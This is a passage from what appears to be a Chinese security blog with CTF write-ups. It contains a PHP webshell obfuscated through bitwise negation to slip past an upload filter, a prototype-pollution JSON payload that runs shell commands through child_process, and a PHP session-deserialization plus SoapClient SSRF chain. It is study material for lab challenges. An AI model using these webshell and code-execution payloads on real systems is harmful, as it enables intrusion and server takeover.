<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">r&quot;http://c86c138f-b79c-45a8-9f85-6841c06aafcc.node4.buuoj.cn/index.php?act=upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_post</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        str_list.append(chr(i))</span><br><span class="line">    <span class="keyword">for</span> str <span class="keyword">in</span> str_list:</span><br><span class="line">        file_post=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        -----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;屏幕截图(3).png&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12345<span class="subst">&#123;str&#125;</span></span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交</span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734--</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r=s.post(url,headers=headers,data=file_post.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_post(url)</span><br></pre></td></tr></table></figure>

<p>经过测试可以通过的字符有：<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>，然后就是汉字了<br>接下里的思路就是思考一下如何构造马去进行上传，如何通过现有字符构造出被过滤的字符，用得一般就是异或操作或者取反，但是异或符号被过滤了，所以这里就用取反去构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__ = [];</span><br><span class="line">$_ = ($__ == $__);<span class="comment">//$_ = 1</span></span><br><span class="line"></span><br><span class="line">$__ = ~(融);</span><br><span class="line">$___ = $__[$_];</span><br><span class="line"><span class="keyword">print</span>($___);<span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>通过以上方法我们可以构造出我们需要的字母，接下来写一个fuzz脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_split_unicode</span>(<span class="params">$str,$l=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($l&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $ret=<span class="keyword">array</span>();</span><br><span class="line">        $len=mb_strlen($str,<span class="string">&#x27;UTF-8&#x27;</span>);<span class="comment">//mb_strlen获取长度</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i += $l) &#123;</span><br><span class="line">            $ret[] = mb_substr($str, $i, $l, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> preg_split(<span class="string">&quot;//u&quot;</span>, $str, <span class="number">-1</span>, PREG_SPLIT_NO_EMPTY);<span class="comment">//preg_split — 通过一个正则表达式分隔字符串，返回汉字</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="string">&#x27;放你的汉字要多一点才行&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$arr_str=str_split_unicode($s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($s) ; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $arr_str[$i].<span class="string">&#x27; ------- &#x27;</span>.~$arr_str[$i][<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来构造马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">a&#x3D;env</span><br></pre></td></tr></table></figure>

<p>然后访问环境变量就可以看到flag了，为啥是环境变量=-=，好像是题目出了问题，本来在根目录的，</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/22/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">GYCTF2020-Ez_Express</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-22</time><div class="content"><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看了一下有注册有登录，于是试了一下<a href="http://www.zip发现有源码泄露：">www.zip发现有源码泄露：</a><br>审计的是thinkphp6.0，看半天看不出个所以然，于是看wp了</p>
<h2 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h2><p>原型链特性：<br>当我们调用一个对象的某属性时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.对象（obj）中寻找这一属性</span><br><span class="line">2.如果找不到，则在obj.proto中寻找属性</span><br><span class="line">3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</span><br></pre></td></tr></table></figure>

<p>以上机制被称为js的prototype的继承链。和node.js沙盒逃逸的原理似乎是一样的<br><strong>举例：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure>

<p><strong>理解：</strong><br>Foo是一个类，prototype是Foo的属性，Foo中所有的实例化后对象都将拥有这个属性，我们在prototype属性中定义了一个方法show，接下来所有实例化后的对象如foo都将直接拥有foo方法。<br><strong>原型链污染定义</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</span><br></pre></td></tr></table></figure>

<p><strong>例：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo=&#123;<span class="attr">bar</span>:<span class="number">1</span>&#125;<span class="comment">//foo是一个对象</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)<span class="comment">//foo.bar此时为1</span></span><br><span class="line">foo.__proto__.bar=<span class="number">2</span><span class="comment">//foo的原型设一个bar值为2</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)<span class="comment">//输出为1，因为foo的bar已经为1</span></span><br><span class="line"><span class="keyword">let</span> zoo=&#123;&#125;<span class="comment">//设zoo的对象为空</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)<span class="comment">//这个时候zoo的bar就为2，现在每个原型都有个属性bar值为2</span></span><br></pre></td></tr></table></figure>

<h3 id="哪些情况下原型链会被污染？"><a href="#哪些情况下原型链会被污染？" class="headerlink" title="哪些情况下原型链会被污染？"></a>哪些情况下原型链会被污染？</h3><p>在含有能够控制数组（对象）的“键名”的操作即可，一般是以出现：<br>merge和clone对象</p>
<h4 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h4><p>以merge,因为merge执行的就是递归，为例，先构造一个简单的merge函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">target, source</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Iterate through `source` properties and if an `Object` set property to merge of `target` and `source` properties</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(source)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) <span class="built_in">Object</span>.assign(source[key], merge(target[key], source[key]))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Join `target` and modified `source`</span></span><br><span class="line">  <span class="built_in">Object</span>.assign(target || &#123;&#125;, source)</span><br><span class="line">  <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age,gender</span>)</span>&#123;<span class="comment">//构造一个person类</span></span><br><span class="line">	<span class="built_in">this</span>.name=name;</span><br><span class="line">	<span class="built_in">this</span>.age=age;</span><br><span class="line">	<span class="built_in">this</span>.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newperson=<span class="keyword">new</span> Person(<span class="string">&quot;test1&quot;</span>,<span class="number">22</span>,<span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&#x27;</span>);<span class="comment">//新建一个job对象</span></span><br><span class="line">merge(newperson,job);<span class="comment">//这个job对象有用title、contry、__proto__属性，并对其进行赋值</span></span><br><span class="line"><span class="built_in">console</span>.log(newperson);</span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype);<span class="comment">//此时per的原型已经被改变为x=1</span></span><br></pre></td></tr></table></figure>

<p>这里解释一下，merge将这几个键值作为一个属性合并到newperson这个对象中了，merge函数执行的其实可以认为是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Person.job.title&#x3D;......</span><br><span class="line">Person.job.__proto__&#x3D;....</span><br></pre></td></tr></table></figure>

<p>这个时候job的原型是Person，所以Person的值就发生了改变。</p>
<h4 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h4><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。通常这些函数类似以下的形式：theFunction(object, path, value)，将对象object的指定路径path上的属性值修改为value。如果攻击者可以控制路径path的值，那么将路径设置为_proto_.theValue，运行theFunction函数之后就有可能将theValue属性注入到object的原型中。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="http://www.zip下载源码：">www.zip下载源码：</a></p>
<p>然后开始审计</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br></pre></td></tr></table></figure>

<p>在index.js找到merge和clone，接下来看看有哪里调用了他们，发现是在/action这里，并且需要user为admin</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>那么就需要先登录，在登录这列发现</p>
<p>**其中<code> &#39;user&#39;:req.body.userid.toUpperCase()</code> 这一句中<code>toUpperCase()</code>函数是为了将字符串中的小写字符转换成大写，但因为javascript的特性，函数存在分险（下图），所以假如我们传入<code>admın</code>的话，经过<code>toUpperCase()</code>的处理后，会变成<code>ADMIN</code>**关于node-js题目的尝试/9.png)</p>
<blockquote>
<p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以我们可以注册用户名为<code>admın</code>然后进行登录即可，接下来在去可以污染的参数那边看看该如何构造payload<br>首先可以可以看到clone在login那边对body进行操作，那么我们的原型链传入的值也应该在那里</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>再往下看,我们outputoFunctionName被渲染了，那么其实思路就很明确了，通过clone原型链污染outputoFunctionName，导致其值被改变，渲染拿到flag</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>: <span class="string">&quot;test;clearTimeout.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; /app/public/reader&#x27;).toString();var test1&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>从语法的角度解释一下这个payload：我们通过污染outputFunctionName的原型，通过constructor访问其向上原型链，获得主环境的function，2然后通过(‘return process’)()获得主环境process变量，通过process.mainModule.require导入child_process模块，实现命令执行,最后将flag输出至/reader中，由于这个outputFunctionName是未定义的，所以我们后面访问它，就会直接赋值为我们定义的这些属性（和上面的原理是一样的）</p>
<p>来自：<br><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724161343.png" alt="img" style="zoom:67%;">
要记得吧传输的内容格式改为json的，然后登陆/info让其被渲染，然后再登录/reader将flag下载下来即可

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>由于语法还是有很多不懂，但还好学沙盒逃逸的时候有掌握一点语法，所以原理还是可以看懂的，但是构造语句还是不太行<br>总结一下js的原型链污染<br>1.寻找merge或者clone函数<br>2.寻找使用这两个函数的对象，查看其是否可控，能渲染</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275619.html">https://www.freebuf.com/articles/web/275619.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p>
<p>js的字符：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/20/lctf-babyphp-s-revenge/">lctf babyphp's revenge</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-20</time><div class="content"><h2 id="php中session反序列化机制"><a href="#php中session反序列化机制" class="headerlink" title="php中session反序列化机制"></a>php中session反序列化机制</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>session中有关序列化配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.serialize_handler&#x3D;php	   	表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure>

<p><code>session.serialize_handler</code>是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
<ul>
<li><p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p>
<p>例：</p>
<p><code>names:6:&quot;spoock&quot;;</code></p>
<p><code>name|s:6:&quot;spoock&quot;;</code>其中name是键值，s:6:”spoock”是反序列化的结果</p>
</li>
<li><p>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br>例：<br><code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;&#125;</code>对一整个name=spoock进行序列化存储</p>
</li>
<li><p>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p>
<p>例：</p>
<p><code>name|s:6:&quot;spoock&quot;;</code>其中name是键值，s:6:”spoock”是反序列化的结果</p>
</li>
</ul>
<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>。示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F; do something</span><br></pre></td></tr></table></figure>

<h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
<h3 id="session反序列化利用"><a href="#session反序列化利用" class="headerlink" title="session反序列化利用"></a>session反序列化利用</h3><p>session序列化的危害主要来自于不同存储引擎的解析存储方法不同，如果对同一组输入值进行不同的解析方式，那么就会产生风险。<br>例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#39;ryat&#39;] &#x3D; &#39;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#39;;</span><br></pre></td></tr></table></figure>

<p>上述session使用的是php_serialize，所以最后的存储内容是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>但是如果我们在读取的过程中选择PHP，那么就会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array (size&#x3D;1)</span><br><span class="line">  &#39;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#39; &#x3D;&gt; </span><br><span class="line">    object(__PHP_Incomplete_Class)[1]</span><br><span class="line">      public &#39;__PHP_Incomplete_Class_Name&#39; &#x3D;&gt; string &#39;PeopleClass&#39; (length&#x3D;11)</span><br></pre></td></tr></table></figure>

<p>也就是PeopClass这个类也会在反序列化读取中被执行<br>这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。<br>这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<h2 id="lctf-bestphp’s-revenge"><a href="#lctf-bestphp’s-revenge" class="headerlink" title="lctf-bestphp’s revenge"></a>lctf-bestphp’s revenge</h2><h3 id="SOAP简介"><a href="#SOAP简介" class="headerlink" title="SOAP简介"></a>SOAP简介</h3><p>SOAP（Simple Object Access Protocol）是一种在 web service 通信时所用的基于 xml 的协议。<br>可以用来修改报文，以及修改访问的目标的ip<br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html">https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html</a></p>
<p>看题目：<br>flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line">echo &#39;only localhost can get flag!&#39;;</span><br><span class="line">$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#39;flag&#39;] &#x3D; $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>他需要loalhost访问，那基本是SSRF的题目了，接下来就寻找一下如何突破:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123;&#125; </span><br></pre></td></tr></table></figure>

<p>我们可以看到这里输出的唯一内容是session，所以我们需要从session进行入手。<br>session通过修改存储机制可以进行反序列化：<br>而session正好有可以修改配置文件的函数<br>session_start()<br>eg：<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720155410.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720155357.png" alt="img" style="zoom:67%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置 cookie 的有效时间为 1 天</span></span><br><span class="line">session_start([</span><br><span class="line">    <span class="string">&#x27;cookie_lifetime&#x27;</span> =&gt; <span class="number">86400</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过调用soapclient类就可以实现修改访问的ip了<br>soapclient内置类的开启需要在php.ini中进行配置<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720160555.png" alt="img" style="zoom:67%;"></p>
<p>接下来就是构造payload，先通过一个简单的实例，通过构造这样的一个类，可以实现发送到服务端地址的改变：<br>这是php手册中关于soapclient类的construct构造的定义<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/soapclient.construct.php">https://www.php.net/manual/zh/soapclient.construct.php</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在 WSDL 模式下工作，则此参数是可选的。如果在非 WSDL 模式下工作，则必须设置location和 uri选项，其中location 是将请求发送到的 SOAP 服务器的 URL,是 SOAP 服务uri 的目标名称空间。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;http://127.0.0.1/&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;a:c\r\n&quot;</span> .<span class="string">&quot;Cookie:PHPSESSID=1&quot;</span>,));</span><br><span class="line"><span class="comment">//这个uri没有强制指定，所以都可以</span></span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure>

<p>好的基本信息大概都清楚了，接下来就是如何利用题目中的函数实现，首先我们先用php_serialize存储机制存入SoapClient，首先构造一下我们需要反序列化的soap类，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;http://test-uri/&quot;</span>,<span class="string">&quot;Cookie:PHPSESSID=i9n0hbcqn1vmhnpdnterckj8h0&quot;</span>))</span><br><span class="line"><span class="comment">//这个uri没有强制指定，所以都可以,PHPsessid需要设置不然访问不到</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call_user_func()把第一个参数作为回调函数调用,其他参数是回调函数的参数</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721090834.png" alt="img"></p>
<p>成功写入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721090758.png" alt="img" style="zoom:67%;"></p>
<p>接下里进行改内容的反序列化调用，由于soap的ssrf是需要调用_call方法的，所以这里我们要想想如何调用什么不存在的类和方法=-=，可想而知 就是这里的welcome_to…..，具体的运作逻辑如下</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091330.png" alt="img" style="zoom:67%;">

<p>几个函数补充了解一下：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091457.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091458.png" alt="img" style="zoom:67%;"></p>
<p>题目中接下来的代码运作是：首先reset将数组的内部指针指向第一个单元也就是SoapClient，然后将welcome_..也合并在这个数组当中</p>
